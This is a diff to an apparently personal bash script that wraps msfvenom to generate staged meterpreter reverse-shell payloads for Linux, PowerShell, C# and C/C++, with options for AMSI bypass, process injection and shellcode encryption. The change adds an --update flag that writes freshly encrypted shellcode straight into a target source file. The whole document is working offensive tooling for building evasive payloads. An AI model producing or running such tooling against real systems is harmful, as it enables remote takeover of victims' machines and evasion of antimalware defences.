@@ -16,6 +16,8 @@ procname=""
 data=""
 incamsi=""
 amsibp=""
+updatefile=""
+tmptoupdate="/tmp/outupdate.txt"
 
 usage() {
 	echo "Arguments: "
@@ -31,6 +33,7 @@ usage() {
 	echo "--procname |    ... process name for powershell + process injection"
 	echo "--incamsi  | -a ... powershell specific @ include asmi bypass file as iex"
 	echo "--amsibp   |    ... powershell specific @ include amsi bypass code before IEX"
+	echo "--update   | -u ... update shell in source code / csharp / c++ for now; Path to the source is mandatory!"
 	echo "--help     | -h ... this help"
 	echo "----------- HELPER SHORTCUTS --------"
 	echo "genlindef   ... linux staged meterpreter (c shell default)"
@@ -41,12 +44,20 @@ usage() {
 	exit 0
 }
 
-opt=$(getopt -l "amsibp,incamsi,enc,help,elf,os:,bit32,iface:,extra:,port:,nostaged,data:,procname:" -a -o ":ahbeni:x:o:p:d:" -- "$@")
+opt=$(getopt -l "amsibp,incamsi,enc,help,elf,os:,bit32,iface:,extra:,port:,nostaged,data:,procname:,update:" -a -o ":ahbeni:x:o:p:d:u:" -- "$@")
 eval set -- "$opt"
 
 
 while true;do
         case $1 in
+		--update|-u)
+			shift
+			updatefile=$1
+			if [ ! -s $updatefile ];then
+				echo "[!] Update file NOT found, exitting!"
+				exit -1
+			fi
+			;;
 		--amsibp)
 			amsibp="--amsibp"
 			;;
@@ -130,7 +141,7 @@ dmpsh() {
 }
 
 
-echo "name: $name / met: $met / iself: $iself / os: $os / bit32: $bit / nostaged: $nstaged | iface: $iface | extra: $others / encrypt: $encrypt / port: $port / procname: $procname"
+echo "name: $name / met: $met / iself: $iself / os: $os / bit32: $bit / nostaged: $nstaged | iface: $iface | extra: $others / encrypt: $encrypt / port: $port / procname: $procname / update: $updatefile"
 
 offset=0
 if [ "$bit" -eq 1 ];then
@@ -194,7 +205,7 @@ if [ "$iself" -eq 1 ];then
 	msfvenom -p $RUNNER LHOST=$IP LPORT=$port $others -o /tmp/sh.elf
 else
 	msfvenom -p $RUNNER LHOST=$IP LPORT=$port -o /tmp/shell.txt $others && cat /tmp/shell.txt | xclip -selection clipboard
-	echo "Stored do clipboardu, shell file /tmp/shell.txt"
+	echo "[i] Shellcode stored do clipboardu, shell file /tmp/shell.txt"
 fi
 SHFILE=""
 if [ "$name" == "genpsshell" ];then
@@ -220,8 +231,12 @@ what=$(echo $others | grep -oe "\(csharp\)\|\(ps1\)\|\(c[ ]\?\)")
 if [ "$encrypt" -eq 1 ];then
 	klic=$(date +%T | tr ":" "_")
 	rot=$(python3 -c 'import random;print(random.randint(3,14))' | tr -d "\n")
-	echo "What: $what / Klic: $klic / rot: $rot"
-	encrypt_shell /tmp/shell.txt $what $klic $rot 
+	echo "[i] What: $what / Klic: $klic / rot: $rot / updatefile: $updatefile"
+	if [ -z "$updatefile" ];then
+		tmptoupdate=""
+	fi
+	encrypt_shell /tmp/shell.txt $what $klic $rot $tmptoupdate
+	replace.py $tmptoupdate $updatefile
 fi
 
 
